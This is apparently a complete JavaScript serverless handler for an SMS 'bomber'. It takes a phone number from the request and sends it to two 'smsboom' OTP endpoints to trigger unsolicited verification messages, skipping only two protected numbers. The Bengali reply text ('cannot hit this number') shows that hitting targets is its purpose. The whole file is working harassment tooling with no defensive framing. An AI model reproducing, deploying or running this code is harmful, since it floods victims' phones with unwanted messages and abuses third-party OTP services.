export default async function handler(req,res){

const {number}=req.query;

if(!number)
return res.status(400).json({error:"number required"});

const BLOCKED=[
"01700000000",
"01800000000"
];

if(BLOCKED.includes(number)){
return res.json({
 ok:false,
 msg:"এই নাম্বারে হিট করা সম্ভব না"
});
}

const APIS=[
"https://smsboom.vercel.app/send-otp",
"https://smsbooma.vercel.app/verify-phone"
];

for(const api of APIS){
 try{
  await fetch(`${api}?number=${encodeURIComponent(number)}`);
 }catch(e){}
}

res.json({ok:true});
}